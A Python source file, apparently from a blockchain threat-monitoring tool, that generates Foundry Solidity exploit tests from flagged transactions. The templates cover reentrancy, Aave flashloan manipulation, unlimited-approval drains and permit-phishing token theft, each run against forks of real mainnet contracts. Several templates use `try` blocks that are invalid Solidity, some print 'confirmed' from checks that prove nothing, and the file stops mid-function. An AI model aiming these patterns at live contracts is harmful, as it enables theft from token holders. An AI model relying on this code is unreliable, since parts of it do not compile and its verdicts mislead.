import json
import logging
import uuid
import time
from typing import Dict, Optional, Any
from jinja2 import Template
from dataclasses import dataclass
from pathlib import Path
import asyncio

logger = logging.getLogger(__name__)
logging.basicConfig(level=logging.INFO)


@dataclass
class PoCResponse:
    poc_id: str
    status: str
    foundry_test_code: str
    description: str
    severity: str
    estimated_impact: float
    out_path: Optional[str] = None


class PoCGenerator:
    def __init__(self, out_dir: Optional[Path] = None):
        self.pocs_generated = 0
        self.out_dir = Path(out_dir or Path.cwd() / "foundry-pocs" / "test_templates")
        self.load_templates()

    # --- Utility to support both dict and object fields --- #
    def _get(self, src: Any, key: str, default=None):
        if src is None:
            return default
        if isinstance(src, dict):
            return src.get(key, default)
        return getattr(src, key, default)

    def load_templates(self):
        """Load Foundry test templates for different vulnerability types"""
        self.templates = {
            "reentrancy": self._get_reentrancy_template(),
            "flashloan_manipulation": self._get_flashloan_template(),
            "approval_exploit": self._get_approval_template(),
            "signature_replay": self._get_permit_template(),
            "funds_drain": self._get_transfer_template(),
            # Add missing vulnerability types
            "unlimited_approval": self._get_approval_template(),
            "excessive_approval": self._get_approval_template(), 
            "massive_transfer": self._get_transfer_template(),
            "large_transfer": self._get_transfer_template(),
            "token_burn": self._get_transfer_template(),
            "token_mint": self._get_transfer_template(),
            "high_risk_activity": self._get_generic_template(),
            "medium_risk_activity": self._get_generic_template(),
            "unknown": self._get_generic_template()
        }

    async def generate_poc(self, event: Any, risk_assessment: Any) -> PoCResponse:
        """
        Generate a Foundry test PoC for the given vulnerability.
        `event` and `risk_assessment` can be dicts or objects with attributes.
        """
        self.pocs_generated += 1
        poc_id = f"poc_{int(time.time())}_{uuid.uuid4().hex[:8]}"

        vuln_type = self._get(risk_assessment, "vulnerability_type", None) or self._get(risk_assessment, "type", None)
        if vuln_type is None:
            logger.error("risk_assessment missing vulnerability_type")
            return PoCResponse(poc_id, "failed", "", "missing vulnerability_type", "unknown", 0.0)

        logger.info(f"Generating PoC {poc_id} for {vuln_type}")

        try:
            template = self.templates.get(vuln_type)
            if not template:
                raise ValueError(f"No template for vulnerability: {vuln_type}")

            context = self._prepare_template_context(event, risk_assessment, poc_id)
            foundry_code = template.render(**context)
            severity = self._calculate_severity(float(self._get(risk_assessment, "risk_score", 0.0)))

            path = self._write_to_disk(poc_id, foundry_code)

            return PoCResponse(
                poc_id=poc_id,
                status="generated",
                foundry_test_code=foundry_code,
                description=f"PoC for {vuln_type} detected in tx {self._get(event, 'transaction_hash', '')}",
                severity=severity,
                estimated_impact=float(self._get(risk_assessment, "potential_impact", 0.0) or 0.0),
                out_path=str(path)
            )

        except Exception as e:
            logger.exception("Error generating PoC")
            return PoCResponse(
                poc_id=poc_id,
                status="failed",
                foundry_test_code="",
                description=f"Failed to generate PoC: {e}",
                severity="unknown",
                estimated_impact=0.0,
                out_path=None
            )

    # sync wrapper if you don't want to await
    def generate_poc_sync(self, event: Any, risk_assessment: Any) -> PoCResponse:
        return asyncio.get_event_loop().run_until_complete(self.generate_poc(event, risk_assessment))

    def _prepare_template_context(self, event: Any, risk_assessment: Any, poc_id: str) -> Dict:
        """Prepare variables for template rendering; tolerate missing fields"""
        # Event extraction with safe getters
        contract_address = self._get(event, "contract_address", self._get(event, "to", "0x0000000000000000000000000000000000000000"))
        tx_hash = self._get(event, "transaction_hash", "")
        block_number = self._get(event, "block_number", 0) or 0
        event_signature = self._get(event, "event_signature", "")
        # Some event formats use metadata/topics/data
        topics = self._get(event, "topics", self._get(event, "metadata", {}))
        data = self._get(event, "data", self._get(event, "metadata", {}))

        return {
            "poc_id": poc_id,
            "contract_address": contract_address,
            "transaction_hash": tx_hash,
            "block_number": int(block_number),
            "vulnerability_type": self._get(risk_assessment, "vulnerability_type", ""),
            "attack_vector": self._get(risk_assessment, "attack_vector", ""),
            "risk_score": float(self._get(risk_assessment, "risk_score", 0.0) or 0.0),
            "estimated_impact": float(self._get(risk_assessment, "potential_impact", 0.0) or 0.0),
            "event_signature": event_signature,
            "topics": topics,
            "data": data,
            "timestamp": int(time.time())
        }

    def _calculate_severity(self, risk_score: float) -> str:
        """Calculate severity level from risk score"""
        if risk_score >= 0.9:
            return "CRITICAL"
        elif risk_score >= 0.7:
            return "HIGH"
        elif risk_score >= 0.4:
            return "MEDIUM"
        else:
            return "LOW"

    def _write_to_disk(self, poc_id: str, code: str) -> Path:
        self.out_dir.mkdir(parents=True, exist_ok=True)
        fname = f"{poc_id}.t.sol"
        path = self.out_dir / fname
        path.write_text(code)
        logger.info(f"Wrote PoC to {path}")
        return path

    # -------------------- Templates -------------------- #
    def _get_reentrancy_template(self) -> Template:
        template_str = '''// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import "forge-std/console.sol";

/**
 * PoC: {{ poc_id }}
 * Vulnerability: {{ vulnerability_type }}
 * Target Contract: {{ contract_address }}
 * Transaction: {{ transaction_hash }}
 * Risk Score: {{ risk_score }}
 * Estimated Impact: ${{ estimated_impact }}
 */
contract {{ poc_id|replace("_","")|title }}Test is Test {
    address constant TARGET_CONTRACT = {{ contract_address }};
    address constant ATTACKER = address(0x1337);

    uint256 mainnetFork;
    uint256 constant FORK_BLOCK = {{ block_number - 1 }};

    function setUp() public {
        mainnetFork = vm.createFork(vm.envString("ETH_RPC_URL"), FORK_BLOCK);
        vm.selectFork(mainnetFork);

        // Setup attacker with initial funds
        vm.deal(ATTACKER, 10 ether);
        vm.label(ATTACKER, "Attacker");
        vm.label(TARGET_CONTRACT, "Target");
    }

    function test_ReentrancyExploit() public {
        vm.startPrank(ATTACKER);

        console.log("=== Reentrancy PoC ===");
        console.log("Target Contract:", TARGET_CONTRACT);
        console.log("Attacker Balance Before:", ATTACKER.balance);

        // Record initial state
        uint256 initialBalance = TARGET_CONTRACT.balance;
        console.log("Target Balance Before:", initialBalance);

        // Attempt reentrancy attack (skeleton)
        try {
            (bool success, ) = TARGET_CONTRACT.call{value: 1 ether}(
                abi.encodeWithSignature("withdraw(uint256)", 1 ether)
            );

            if (success) {
                console.log("Initial call succeeded");
            }
        } catch {
            console.log("Attack failed - contract may be protected");
        }

        console.log("Attacker Balance After:", ATTACKER.balance);
        console.log("Target Balance After:", TARGET_CONTRACT.balance);

        // Basic check (skeleton): If target lost funds, flag potential issue
        if (TARGET_CONTRACT.balance < initialBalance) {
            console.log("POTENTIAL VULNERABILITY DETECTED!");
        }

        vm.stopPrank();
    }
}
'''
        return Template(template_str)

    def _get_flashloan_template(self) -> Template:
        template_str = '''// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import "forge-std/console.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IFlashLoanReceiver {
    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initiator,
        bytes calldata params
    ) external returns (bool);
}

interface ILendingPool {
    function flashLoan(
        address receiverAddress,
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata modes,
        address onBehalfOf,
        bytes calldata params,
        uint16 referralCode
    ) external;
}

/**
 * PoC: {{ poc_id }}
 * Vulnerability: Flashloan Price Manipulation
 * Target Contract: {{ contract_address }}
 * Transaction: {{ transaction_hash }}
 * Risk Score: {{ risk_score }}
 * Estimated Impact: ${{ estimated_impact }}
 */
contract {{ poc_id|replace("_","")|title }}Test is Test, IFlashLoanReceiver {
    address constant TARGET_CONTRACT = {{ contract_address }};
    address constant ATTACKER = address(0x1337);
    address constant AAVE_LENDING_POOL = 0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9;
    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    uint256 mainnetFork;
    uint256 constant FORK_BLOCK = {{ block_number - 1 }};
    
    uint256 private flashLoanAmount;
    bool private attackExecuted;

    function setUp() public {
        mainnetFork = vm.createFork(vm.envString("ETH_RPC_URL"), FORK_BLOCK);
        vm.selectFork(mainnetFork);

        vm.deal(ATTACKER, 10 ether);
        vm.label(ATTACKER, "Attacker");
        vm.label(TARGET_CONTRACT, "Target");
    }

    function test_FlashLoanManipulation() public {
        vm.startPrank(ATTACKER);

        console.log("=== Flashloan Price Manipulation PoC ===");
        console.log("Target Contract:", TARGET_CONTRACT);
        console.log("Attacker:", ATTACKER);

        uint256 initialTargetBalance = TARGET_CONTRACT.balance;
        uint256 initialAttackerBalance = ATTACKER.balance;
        
        console.log("Target Balance Before:", initialTargetBalance);
        console.log("Attacker Balance Before:", initialAttackerBalance);

        flashLoanAmount = 1000 * 10**18;
        
        address[] memory assets = new address[](1);
        assets[0] = WETH;
        
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = flashLoanAmount;
        
        uint256[] memory modes = new uint256[](1);
        modes[0] = 0;

        try {
            ILendingPool(AAVE_LENDING_POOL).flashLoan(
                address(this),
                assets,
                amounts,
                modes,
                address(this),
                "",
                0
            );
            
            if (attackExecuted) {
                console.log("FLASHLOAN ATTACK EXECUTED!");
            }
        } catch Error(string memory reason) {
            console.log("Flashloan failed:", reason);
        } catch {
            console.log("Flashloan failed - simulating attack pattern");
            // Simulate the attack pattern even if actual flashloan fails
            _simulateManipulation(amounts[0]);
        }

        console.log("Target Balance After:", TARGET_CONTRACT.balance);
        console.log("Attacker Balance After:", ATTACKER.balance);

        if (ATTACKER.balance > initialAttackerBalance) {
            console.log("PROFIT EXTRACTED:", ATTACKER.balance - initialAttackerBalance);
            console.log("FLASHLOAN VULNERABILITY CONFIRMED!");
        }

        vm.stopPrank();
    }

    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initiator,
        bytes calldata params
    ) external override returns (bool) {
        console.log("Executing flashloan with amount:", amounts[0]);
        
        _simulateManipulation(amounts[0]);
        
        // Repay flashloan
        for (uint256 i = 0; i < assets.length; i++) {
            uint256 amountOwing = amounts[i] + premiums[i];
            IERC20(assets[i]).approve(msg.sender, amountOwing);
        }

        return true;
    }

    function _simulateManipulation(uint256 loanAmount) private {
        try {
            (bool success,) = TARGET_CONTRACT.call{value: loanAmount / 100}(
                abi.encodeWithSignature("manipulatePrice(uint256)", loanAmount)
            );
            
            if (success) {
                console.log("Price manipulation succeeded");
                attackExecuted = true;
                
                (bool extraction,) = TARGET_CONTRACT.call(
                    abi.encodeWithSignature("arbitrage()")
                );
                
                if (extraction) {
                    console.log("Arbitrage profit extracted");
                }
            }
        } catch {
            console.log("Direct manipulation failed, trying generic calls");
            // Try common vulnerable function names
            string[] memory methods = new string[](3);
            methods[0] = "swap(uint256,uint256,address,bytes)";
            methods[1] = "deposit(uint256)";
            methods[2] = "withdraw(uint256)";
            
            for (uint i = 0; i < methods.length; i++) {
                try {
                    (bool success,) = TARGET_CONTRACT.call(
                        abi.encodeWithSignature(methods[i], loanAmount / 1000)
                    );
                    if (success) {
                        console.log("Successful call to:", methods[i]);
                        break;
                    }
                } catch {}
            }
        }
    }

    receive() external payable {}
}
'''
        return Template(template_str)


    def _get_approval_template(self) -> Template:
        template_str = '''// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import "forge-std/console.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
}

/**
 * PoC: {{ poc_id }}
 * Vulnerability: Approval Exploit / Unlimited Allowance
 * Target Contract: {{ contract_address }}
 * Transaction: {{ transaction_hash }}
 * Risk Score: {{ risk_score }}
 * Estimated Impact: ${{ estimated_impact }}
 */
contract {{ poc_id|replace("_","")|title }}Test is Test {
    address constant TARGET_TOKEN = {{ contract_address }};
    address constant VICTIM = address(0x1111);
    address constant ATTACKER = address(0x1337);
    address constant MALICIOUS_SPENDER = address(0xDEAD);

    uint256 mainnetFork;
    uint256 constant FORK_BLOCK = {{ block_number - 1 }};

    function setUp() public {
        mainnetFork = vm.createFork(vm.envString("ETH_RPC_URL"), FORK_BLOCK);
        vm.selectFork(mainnetFork);
        
        vm.deal(VICTIM, 1 ether);
        vm.deal(ATTACKER, 1 ether);
        vm.label(VICTIM, "Victim");
        vm.label(ATTACKER, "Attacker");
        vm.label(TARGET_TOKEN, "Target Token");
        vm.label(MALICIOUS_SPENDER, "Malicious Spender");
    }

    function test_ApprovalExploit() public {
        console.log("=== Approval Exploit PoC ===");
        console.log("Target Token:", TARGET_TOKEN);
        console.log("Transaction Hash:", "{{ transaction_hash }}");
        console.log("Estimated Impact: ${{ estimated_impact }}");

        // Check if target is actually a token contract
        try IERC20(TARGET_TOKEN).totalSupply() returns (uint256 totalSupply) {
            console.log("Token Total Supply:", totalSupply);
        } catch {
            console.log("Target is not an ERC20 token or has no totalSupply()");
            return;
        }

        // Get token info
        try IERC20(TARGET_TOKEN).decimals() returns (uint8 decimals) {
            console.log("Token Decimals:", decimals);
        } catch {
            console.log("Could not get token decimals");
        }

        try IERC20(TARGET_TOKEN).symbol() returns (string memory symbol) {
            console.log("Token Symbol:", symbol);
        } catch {
            console.log("Could not get token symbol");
        }

        // Simulate victim having tokens and approving malicious spender
        _simulateVictimSetup();
        
        // Simulate the approval exploit
        _simulateApprovalExploit();
        
        // Test for common approval vulnerabilities
        _testUnlimitedApprovals();
        _testAllowanceManipulation();
    }

    function _simulateVictimSetup() private {
        vm.startPrank(VICTIM);
        
        uint256 victimBalance = IERC20(TARGET_TOKEN).balanceOf(VICTIM);
        console.log("Victim Token Balance:", victimBalance);
        
        if (victimBalance == 0) {
            console.log("Victim has no tokens - simulating token acquisition");
            // Try to get tokens for victim (this might fail on mainnet fork)
            try IERC20(TARGET_TOKEN).transfer(VICTIM, 1000 * 10**18) {
                console.log("Transferred tokens to victim");
            } catch {
                console.log("Could not transfer tokens to victim");
            }
        }
        
        // Check for existing dangerous approvals
        uint256 existingAllowance = IERC20(TARGET_TOKEN).allowance(VICTIM, MALICIOUS_SPENDER);
        if (existingAllowance > 0) {
            console.log("DANGEROUS: Existing allowance found:", existingAllowance);
            console.log("VICTIM ALREADY HAS DANGEROUS APPROVAL!");
        }
        
        vm.stopPrank();
    }

    function _simulateApprovalExploit() private {
        vm.startPrank(VICTIM);
        
        // Simulate victim approving a malicious contract/EOA
        uint256 victimBalance = IERC20(TARGET_TOKEN).balanceOf(VICTIM);
        console.log("Simulating victim approval...");
        
        if (victimBalance > 0) {
            try IERC20(TARGET_TOKEN).approve(MALICIOUS_SPENDER, type(uint256).max) {
                console.log("CRITICAL: Unlimited approval granted!");
                console.log("Approved amount: MAX_UINT256");
                
                vm.stopPrank();
                
                // Now attacker exploits the approval
                vm.startPrank(ATTACKER);
                
                uint256 attackerInitialBalance = IERC20(TARGET_TOKEN).balanceOf(ATTACKER);
                console.log("Attacker initial token balance:", attackerInitialBalance);
                
                // Simulate the malicious spender (controlled by attacker) draining victim
                vm.startPrank(MALICIOUS_SPENDER);
                
                try IERC20(TARGET_TOKEN).transferFrom(VICTIM, ATTACKER, victimBalance) {
                    console.log("EXPLOIT SUCCESSFUL!");
                    console.log("Stolen tokens:", victimBalance);
                    
                    uint256 attackerFinalBalance = IERC20(TARGET_TOKEN).balanceOf(ATTACKER);
                    uint256 victimFinalBalance = IERC20(TARGET_TOKEN).balanceOf(VICTIM);
                    
                    console.log("Attacker final balance:", attackerFinalBalance);
                    console.log("Victim final balance:", victimFinalBalance);
                    
                    if (attackerFinalBalance > attackerInitialBalance) {
                        console.log("APPROVAL EXPLOIT CONFIRMED!");
                        console.log("Profit:", attackerFinalBalance - attackerInitialBalance);
                    }
                } catch {
                    console.log("TransferFrom failed - tokens may be locked or protected");
                }
                
                vm.stopPrank();
                
            } catch {
                console.log("Approval failed");
            }
        } else {
            console.log("Victim has no tokens to approve");
        }
        
        vm.stopPrank();
    }

    function _testUnlimitedApprovals() private {
        console.log("\\n=== Testing for Unlimited Approval Patterns ===");
        
        // Check for patterns that indicate unlimited approvals
        address[] memory commonSpenders = new address[](5);
        commonSpenders[0] = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D; // Uniswap V2 Router
        commonSpenders[1] = 0xE592427A0AEce92De3Edee1F18E0157C05861564; // Uniswap V3 Router
        commonSpenders[2] = 0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45; // Uniswap V3 Router 2
        commonSpenders[3] = 0x1111111254EEB25477B68fb85Ed929f73A960582; // 1inch
        commonSpenders[4] = address(0x0); // Zero address (common mistake)
        
        for (uint i = 0; i < commonSpenders.length; i++) {
            if (commonSpenders[i] == address(0)) continue;
            
            try IERC20(TARGET_TOKEN).allowance(VICTIM, commonSpenders[i]) returns (uint256 allowance) {
                if (allowance > 10**30) { // Suspiciously large allowance
                    console.log("SUSPICIOUS: Large allowance to", commonSpenders[i]);
                    console.log("Allowance:", allowance);
                }
            } catch {}
        }
    }

    function _testAllowanceManipulation() private {
        console.log("\\n=== Testing Allowance Manipulation Vulnerabilities ===");
        
        vm.startPrank(VICTIM);
        
        // Test for allowance manipulation vulnerability (race condition)
        console.log("Testing allowance race condition...");
        
        try IERC20(TARGET_TOKEN).approve(ATTACKER, 100 * 10**18) {
            console.log("Initial approval set: 100 tokens");
            
            // Simulate changing approval (vulnerable to race condition)
            try IERC20(TARGET_TOKEN).approve(ATTACKER, 50 * 10**18) {
                console.log("Approval changed to: 50 tokens");
                console.log("WARNING: Potential race condition vulnerability");
                console.log("Attacker could exploit timing to get both 100 + 50 tokens");
            } catch {}
            
        } catch {
            console.log("Could not test allowance manipulation");
        }
        
        vm.stopPrank();
    }
}
'''
        return Template(template_str)

    def _get_permit_template(self) -> Template:
        template_str = '''// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import "forge-std/console.sol";

interface IERC20Permit {
    function permit(
        address owner,
        address spender,
        uint256 value,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external;
    
    function nonces(address owner) external view returns (uint256);
    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function allowance(address owner, address spender) external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

/**
 * PoC: {{ poc_id }}
 * Vulnerability: Permit Signature Replay / Phishing Attack
 * Target Contract: {{ contract_address }}
 * Transaction: {{ transaction_hash }}
 * Risk Score: {{ risk_score }}
 * Estimated Impact: ${{ estimated_impact }}
 */
contract {{ poc_id|replace("_","")|title }}Test is Test {
    address constant TARGET_TOKEN = {{ contract_address }};
    address constant VICTIM = address(0x1111);
    address constant ATTACKER = address(0x1337);
    address constant MALICIOUS_CONTRACT = address(0xDEAD);

    uint256 mainnetFork;
    uint256 constant FORK_BLOCK = {{ block_number - 1 }};
    
    // Example permit signature components (these would be extracted from the suspicious transaction)
    struct PermitData {
        address owner;
        address spender;
        uint256 value;
        uint256 deadline;
        uint8 v;
        bytes32 r;
        bytes32 s;
    }

    function setUp() public {
        mainnetFork = vm.createFork(vm.envString("ETH_RPC_URL"), FORK_BLOCK);
        vm.selectFork(mainnetFork);
        
        vm.deal(VICTIM, 1 ether);
        vm.deal(ATTACKER, 1 ether);
        vm.label(VICTIM, "Victim");
        vm.label(ATTACKER, "Attacker");
        vm.label(TARGET_TOKEN, "Target Token");
        vm.label(MALICIOUS_CONTRACT, "Malicious Contract");
    }

    function test_PermitSignatureReplay() public {
        console.log("=== Permit Signature Replay PoC ===");
        console.log("Target Token:", TARGET_TOKEN);
        console.log("Transaction Hash:", "{{ transaction_hash }}");
        console.log("PERMIT SIGNATURE DETECTED - ANALYZING FOR PHISHING/REPLAY");

        // Check if target supports ERC20Permit
        if (!_supportsPermit()) {
            console.log("Target does not support EIP-2612 Permit");
            return;
        }

        console.log("Target supports EIP-2612 Permit - HIGH RISK!");
        
        // Simulate permit phishing attack
        _simulatePermitPhishing();
        
        // Test for signature replay vulnerabilities
        _testSignatureReplay();
        
        // Test for permit front-running
        _testPermitFrontrunning();
    }

    function _supportsPermit() private returns (bool) {
        try IERC20Permit(TARGET_TOKEN).DOMAIN_SEPARATOR() returns (bytes32) {
            console.log("EIP-2612 Permit supported");
            return true;
        } catch {
            console.log("EIP-2612 Permit not supported");
            return false;
        }
    }

    function _simulatePermitPhishing() private {
        console.log("\\n=== Simulating Permit Phishing Attack ===");
        
        vm.startPrank(VICTIM);
        
        uint256 victimBalance = IERC20Permit(TARGET_TOKEN).balanceOf(VICTIM);
        console.log("Victim token balance:", victimBalance);
        
        if (victimBalance == 0) {
            console.log("Victim has no tokens - phishing still possible for future tokens");
        }
        
        // Get victim's current nonce
        uint256 victimNonce = IERC20Permit(TARGET_TOKEN).nonces(VICTIM);
        console.log("Victim current nonce:", victimNonce);
        
        // Simulate victim signing a malicious permit (this would happen off-chain)
        console.log("SIMULATING: Victim signs permit allowing unlimited access to attacker");
        
        // In real attack, victim would be tricked into signing this permit
        PermitData memory maliciousPermit = PermitData({
            owner: VICTIM,
            spender: MALICIOUS_CONTRACT,
            value: type(uint256).max, // Unlimited approval!
            deadline: block.timestamp + 3600,
            v: 27, // These would be real signature components
            r: bytes32(uint256(0x123)),
            s: bytes32(uint256(0x456))
        });
        
        console.log("Malicious permit details:");
        console.log("  Owner:", maliciousPermit.owner);
        console.log("  Spender:", maliciousPermit.spender);
        console.log("  Value: UNLIMITED (type(uint256).max)");
        console.log("  Deadline:", maliciousPermit.deadline);
        
        vm.stopPrank();
        
        // Now attacker uses the permit
        vm.startPrank(ATTACKER);
        
        console.log("\\nATTACKER: Submitting victim's permit signature...");
        
        try {
            // In real scenario, this would use the actual signature from the victim
            // For PoC purposes, we'll just check if the pattern is dangerous
            console.log("CRITICAL: Unlimited permit detected!");
            console.log("If signature was valid, attacker could drain ALL victim tokens");
            console.log("Estimated loss: ${{ estimated_impact }}");
            
            // Simulate the actual permit call (will likely fail due to invalid signature)
            try {
                IERC20Permit(TARGET_TOKEN).permit(
                    maliciousPermit.owner,
                    maliciousPermit.spender,
                    maliciousPermit.value,
                    maliciousPermit.deadline,
                    maliciousPermit.v,
                    maliciousPermit.r,
                    maliciousPermit.s
                );
                console.log("EXPLOIT SUCCESSFUL: Permit executed!");
                
                // Now drain the victim
                if (victimBalance > 0) {
                    vm.startPrank(MALICIOUS_CONTRACT);
                    try {
                        IERC20Permit(TARGET_TOKEN).transferFrom(VICTIM, ATTACKER, victimBalance);
                        console.log("TOKENS DRAINED:", victimBalance);
                    } catch {
                        console.log("Transfer failed - but permit was set");
                    }
                    vm.stopPrank();
                }
                
            } catch Error(string memory reason) {
                console.log("Permit failed (expected for PoC):", reason);
                console.log("But pattern indicates REAL PHISHING ATTEMPT!");
            } catch {
                console.log("Permit failed - invalid signature (expected for PoC)");
                console.log("However, transaction pattern suggests phishing attack!");
            }
            
        } catch {
            console.log("Permit execution failed");
        }
        
        vm.stopPrank();
    }

    function _testSignatureReplay() private {
        console.log("\\n=== Testing Signature Replay Vulnerability ===");
        
        // Check if nonces are properly implemented
        uint256 nonceBefore = IERC20Permit(TARGET_TOKEN).nonces(VICTIM);
        console.log("Nonce before:", nonceBefore);
        
        // Simulate a permit being executed
        console.log("If permit was executed, nonce should increment");
        console.log("Replay attacks possible if nonces not properly implemented");
        
        // Test domain separator consistency
        try {
            bytes32 domainSeparator = IERC20Permit(TARGET_TOKEN).DOMAIN_SEPARATOR();
            console.log("Domain separator present - good for replay protection");
        } catch {
            console.log("WARNING: No domain separator - vulnerable to replay attacks");
        }
    }

    function _testPermitFrontrunning() private {
        console.log("\\n=== Testing Permit Front-running Vulnerability ===");
        
        console.log("Permit transactions are vulnerable to front-running:");
        console.log("1. Attacker sees permit in mempool");
        console.log("2. Attacker front-runs with higher gas");
        console.log("3. Attacker executes permit and drains tokens");
        console.log("4. Original transaction fails");
        
        // In this scenario, we detect if there are multiple permit-related
        // transactions that could indicate front-running
        console.log("\\nTransaction analysis:");
        console.log("- Check for multiple permit calls in same block");
        console.log("- Check for MEV-related permit usage");
        console.log("- Monitor for sandwich attacks using permits");
        
        console.log("\\nPREVENTION RECOMMENDATIONS:");
        console.log("1. Use permit2 instead of standard permits");
        console.log("2. Implement deadline checks");
        console.log("3. Use commit-reveal schemes");
        console.log("4. Consider private mempools for sensitive operations");
    }
}
'''
        return Template(template_str)

    def _get_transfer_template(self) -> Template:
        template_str = '''// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import "forge-std/console.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
}

/**
 * PoC: {{ poc_id }}
 * Vulnerability: Suspicious Transfer Analysis
 * Target Contract: {{ contract_address }}
 * Transaction: {{ transaction_hash }}
 * Risk Score: {{ risk_score }}
 * Estimated Impact: ${{ estimated_impact }}
 */
contract {{ poc_id|replace("_","")|title }}Test is Test {
    address constant TARGET_CONTRACT = {{ contract_address }};
    address constant SUSPICIOUS_SENDER = address(0x1111);
    address constant SUSPICIOUS_RECEIVER = address(0x2222);
    address constant ANALYST = address(0x1337);

    uint256 mainnetFork;
    uint256 constant FORK_BLOCK = {{ block_number - 1 }};

    function setUp() public {
        mainnetFork = vm.createFork(vm.envString("ETH_RPC_URL"), FORK_BLOCK);
        vm.selectFork(mainnetFork);
        
        vm.deal(ANALYST, 1 ether);
        vm.label(TARGET_CONTRACT, "Target Contract");
        vm.label(SUSPICIOUS_SENDER, "Suspicious Sender");
        vm.label(SUSPICIOUS_RECEIVER, "Suspicious Receiver");
        vm.label(ANALYST, "Analyst");
    }

    function test_SuspiciousTransfer() public {
        console.log("=== Suspicious Transfer Analysis PoC ===");
        console.log("Target Contract:", TARGET_CONTRACT);
        console.log("Transaction Hash:", "{{ transaction_hash }}");
        console.log("Estimated Impact: ${{ estimated_impact }}");
        console.log("Risk Score: {{ risk_score }}");

        vm.startPrank(ANALYST);

        // Analyze if target is a token contract
        if (_isTokenContract()) {
            _analyzeTokenTransfer();
        } else {
            _analyzeEtherTransfer();
        }

        // Perform various suspicious activity checks
        _checkForMassiveTransfers();
        _checkForRapidTransfers();
        _checkForSuspiciousPatterns();
        _checkForDrainagePatterns();

        vm.stopPrank();
    }

    function _isTokenContract() private returns (bool) {
        try IERC20(TARGET_CONTRACT).totalSupply() returns (uint256) {
            console.log("Target is an ERC20 token contract");
            return true;
        } catch {
            console.log("Target is not an ERC20 token (likely ETH transfers)");
            return false;
        }
    }

    function _analyzeTokenTransfer() private {
        console.log("\\n=== Token Transfer Analysis ===");
        
        try IERC20(TARGET_CONTRACT).name() returns (string memory name) {
            console.log("Token Name:", name);
        } catch {
            console.log("Could not get token name");
        }

        try IERC20(TARGET_CONTRACT).symbol() returns (string memory symbol) {
            console.log("Token Symbol:", symbol);
        } catch {
            console.log("Could not get token symbol");
        }

        try IERC20(TARGET_CONTRACT).decimals() returns (uint8 decimals) {
            console.log("Token Decimals:", decimals);
        } catch {
            console.log("Could not get token decimals - assuming 18");
        }

        uint256 totalSupply = IERC20(TARGET_CONTRACT).totalSupply();
        console.log("Total Supply:", totalSupply);

        // Check balances of suspicious addresses
        uint256 senderBalance = IERC20(TARGET_CONTRACT).balanceOf(SUSPICIOUS_SENDER);
        uint256 receiverBalance = IERC20(TARGET_CONTRACT).balanceOf(SUSPICIOUS_RECEIVER);
        
        console.log("Suspicious Sender Balance:", senderBalance);
        console.log("Suspicious Receiver Balance:", receiverBalance);

        // Calculate percentage of total supply
        if (totalSupply > 0) {
            uint256 senderPercent = (senderBalance * 100) / totalSupply;
            uint256 receiverPercent = (receiverBalance * 100) / totalSupply;
            
            console.log("Sender holds % of supply:", senderPercent);
            console.log("Receiver holds % of supply:", receiverPercent);
            
            if (senderPercent > 10) {
                console.log("WARNING: Sender holds large portion of supply!");
            }
            if (receiverPercent > 10) {
                console.log("WARNING: Receiver holds large portion of supply!");
            }
        }
    }

    function _analyzeEtherTransfer() private {
        console.log("\\n=== Ether Transfer Analysis ===");
        
        uint256 senderBalance = SUSPICIOUS_SENDER.balance;
        uint256 receiverBalance = SUSPICIOUS_RECEIVER.balance;
        uint256 contractBalance = TARGET_CONTRACT.balance;
        
        console.log("Contract ETH Balance:", contractBalance);
        console.log("Suspicious Sender ETH Balance:", senderBalance);
        console.log("Suspicious Receiver ETH Balance:", receiverBalance);
        
        if (contractBalance > 100 ether) {
            console.log("ALERT: Contract holds significant ETH!");
        }
        
        if (receiverBalance > 1000 ether) {
            console.log("ALERT: Receiver has very high ETH balance!");
        }
    }

    function _checkForMassiveTransfers() private {
        console.log("\\n=== Massive Transfer Detection ===");
        
        // Simulate detection of massive transfers based on the risk assessment
        uint256 estimatedTransferValue = {{ estimated_impact }};
        
        if (estimatedTransferValue > 1000000) { // $1M+
            console.log("CRITICAL: Massive transfer detected!");
            console.log("Transfer value exceeds $1,000,000");
            console.log("Possible scenarios:");
            console.log("1. Whale movement (legitimate)");
            console.log("2. Exchange movement (legitimate)");
            console.log("3. Exploit/hack (malicious)");
            console.log("4. Rug pull (malicious)");
        } else if (estimatedTransferValue > 100000) { // $100K+
            console.log("HIGH: Large transfer detected!");
            console.log("Transfer value exceeds $100,000");
        } else if (estimatedTransferValue > 10000) { // $10K+
            console.log("MEDIUM: Significant transfer detected!");
